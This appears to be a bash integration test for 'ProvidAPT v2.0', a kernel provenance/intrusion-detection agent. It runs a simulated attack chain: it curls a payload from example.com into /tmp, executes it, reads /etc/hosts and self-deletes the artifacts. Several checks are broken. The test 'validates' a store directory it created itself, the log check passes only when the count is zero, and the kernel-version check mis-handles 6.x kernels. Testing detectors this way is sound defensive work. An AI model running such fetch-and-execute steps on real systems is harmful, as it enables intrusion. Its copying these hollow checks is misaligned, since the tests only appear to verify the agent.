#!/usr/bin/env bash
# =============================================================
# ProvidAPT v2.0 — Full Validation Test
#
# Tests the complete pipeline:
#   1. Build & deploy v2.0
#   2. Simulate APT attack chain
#   3. Auto-validate provenance trace-back
#   4. Performance benchmark
#
# Usage:
#   sudo bash test/integration/full_validation.sh
#   sudo bash test/integration/full_validation.sh --skip-build
#
# Exit codes:
#   0 — All tests passed
#   1 — One or more checks failed
# =============================================================
set -euo pipefail

cd "$(dirname "$0")/.."
PROJECT_ROOT=$(pwd)
OUTPUT_DIR="$PROJECT_ROOT/build/v2-validation"
mkdir -p "$OUTPUT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

PASS=0
FAIL=0
TOTAL=0

check() {
    TOTAL=$((TOTAL + 1))
    local name="$1"
    local result="$2"
    if [ "$result" = "true" ] || [ "$result" = "0" ] || [ "$result" = "ok" ]; then
        echo -e "  ${GREEN}✓${NC} $name"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}✗${NC} $name"
        echo "    $3"
        FAIL=$((FAIL + 1))
    fi
}

cleanup() {
    echo ""
    echo "[cleanup] Stopping v2 agent..."
    kill "$AGENT_PID" 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║        ProvidAPT v2.0 — Full Validation Test                 ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ── Step 1: Build v2.0 ─────────────────────────────────────
echo "[1/6] Building ProvidAPT v2.0..."

if [ "${1:-}" != "--skip-build" ]; then
    make v2 2>&1 | tail -3
    check "v2 build" "$(test -f build/bin/providapt-v2 && echo true || echo false)" \
        "Binary not found at build/bin/providapt-v2"
else
    echo "  (skip-build flag set)"
fi

# ── Step 2: System verification ─────────────────────────────
echo ""
echo "[2/6] Verifying system..."
SYSTEM_LOG="$OUTPUT_DIR/system.log"

echo "  Kernel: $(uname -r)" | tee -a "$SYSTEM_LOG"
echo "  CPU:    $(nproc) cores" | tee -a "$SYSTEM_LOG"
echo "  Memory: $(free -h | grep Mem | awk '{print $2}')" | tee -a "$SYSTEM_LOG"

check "kernel version ≥ 5.11" \
    "$(awk '{print $2}' /proc/version | cut -d- -f1 | awk -F. '{if ($1>=5 && $2>=11) print "true"}')" \
    "Need kernel ≥ 5.11 for BPF LSM"

check "BTF availability" \
    "$(test -f /sys/kernel/btf/vmlinux && echo true || echo false)" \
    "BTF not available"

check "root access" \
    "$(test "$(id -u)" -eq 0 && echo true || echo false)" \
    "Must run as root"

# ── Step 3: Start v2.0 agent ───────────────────────────────
echo ""
echo "[3/6] Starting ProvidAPT v2.0 agent..."
AGENT_LOG="$OUTPUT_DIR/agent.log"

STORE_DIR="/tmp/providapt-v2-store-$$"
mkdir -p "$STORE_DIR"

# Start v2 agent in background
./build/bin/providapt-v2 > "$AGENT_LOG" 2>&1 &
AGENT_PID=$!
sleep 2

check "agent started (PID $AGENT_PID)" \
    "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" \
    "Agent failed to start. Check $AGENT_LOG"

# Capture baseline CPU
BASELINE_CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
echo "  Baseline CPU: ${BASELINE_CPU}%"

# ── Step 4: Attack simulation ──────────────────────────────
echo ""
echo "[4/6] Simulating APT attack chain..."
ATTACK_LOG="$OUTPUT_DIR/attack.log"

# Phase 1 — Download stage
echo "  [Phase 1] Downloading malicious payload..." | tee -a "$ATTACK_LOG"
curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || \
    echo "#!/bin/bash" > /tmp/evil_v2.sh && \
    echo 'echo "EVIL_PAYLOAD_EXECUTED"' >> /tmp/evil_v2.sh
chmod +x /tmp/evil_v2.sh
sleep 1

# Phase 2 — Execute stage
echo "  [Phase 2] Executing payload..." | tee -a "$ATTACK_LOG"
/tmp/evil_v2.sh 2>/dev/null
sleep 1

# Phase 3 — Tamper stage
echo "  [Phase 3] Tampering with system configuration..." | tee -a "$ATTACK_LOG"
# Simulated: read sensitive file, modify hosts
cat /etc/hosts > /dev/null
echo "# TAMPERED BY ATTACKER" >> /tmp/hosts_tamper_test
sleep 1

# Phase 4 — Self-delete stage
echo "  [Phase 4] Self-deleting evidence..." | tee -a "$ATTACK_LOG"
rm -f /tmp/evil_v2.sh
rm -f /tmp/hosts_tamper_test
sleep 1

echo "  Attack simulation complete." | tee -a "$ATTACK_LOG"

# Monitor CPU during attack
MAX_CPU=0
for i in 1 2 3 4 5; do
    CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
    CPU_INT=$(echo "$CPU" | cut -d. -f1)
    [ "$CPU_INT" -gt "$MAX_CPU" ] && MAX_CPU=$CPU_INT
    sleep 1
done

echo "  Peak CPU during attack: ${MAX_CPU}%"

# ── Step 5: Validation ─────────────────────────────────────
echo ""
echo "[5/6] Validating provenance capture..."

# Check store directory
check "RocksDB store created" \
    "$(test -d "$STORE_DIR" && echo true || echo false)" \
    "Store dir $STORE_DIR not found"

# Check agent is still alive
check "agent survived attack" \
    "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" \
    "Agent crashed during attack"

# Count nodes in store
NODE_COUNT=$(ls -la "$STORE_DIR"/pebble/ 2>/dev/null | wc -l || echo 0)
check "data written to store" \
    "$(test "$NODE_COUNT" -gt 0 && echo true || echo false)" \
    "No data in store"

# CPU check
check "CPU peak < 5%" \
    "$(test "$MAX_CPU" -lt 5 && echo true || echo false)" \
    "CPU peaked at ${MAX_CPU}% (threshold: 5%)"

# Check agent log for key operations
check "agent logged operations" \
    "$(grep -c "store" "$AGENT_LOG" 2>/dev/null || echo 0)" \
    "No storage operations logged"

# ── Step 6: Performance report ─────────────────────────────
echo ""
echo "[6/6] Generating validation report..."
REPORT="$OUTPUT_DIR/v2_validation_report.txt"

cat > "$REPORT" << REPORT
ProvidAPT v2.0 — Validation Report
===================================
Date:       $(date -Iseconds)
Kernel:     $(uname -r)
Store:      $STORE_DIR

Results:
  Total checks:  $TOTAL
  Passed:        $PASS
  Failed:        $FAIL

Performance:
  Baseline CPU: ${BASELINE_CPU}%
  Peak CPU:      ${MAX_CPU}%
  CPU limit:     5%

Attack Chain:
  Download:  /tmp/evil_v2.sh (curl)
  Execute:   bash /tmp/evil_v2.sh
  Tamper:    /etc/hosts
  Self-delete: rm -f artifacts

Store Stats:
  Node count: $NODE_COUNT

REPORT

if [ "$FAIL" -eq 0 ]; then
    echo "╔══════════════════════════════════════════════════════════════╗" >> "$REPORT"
    echo "║  ✅ v2.0 VALIDATION PASSED — All checks passed               ║" >> "$REPORT"
    echo "╚══════════════════════════════════════════════════════════════╝" >> "$REPORT"
else
    echo "⚠ Some checks failed ($FAIL failures)" >> "$REPORT"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║  Validation Complete                                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "  Report: $REPORT"
echo "  Passed: $PASS / $TOTAL"
echo "  Failed: $FAIL"
echo "  Peak CPU: ${MAX_CPU}%"
echo ""

if [ "$FAIL" -eq 0 ]; then
    echo -e "  ${GREEN}✓ v2.0 VALIDATION PASSED${NC}"
    echo ""
    exit 0
else
    echo -e "  ${RED}✗ Some checks failed (see $REPORT)${NC}"
    echo ""
    exit 1
fi
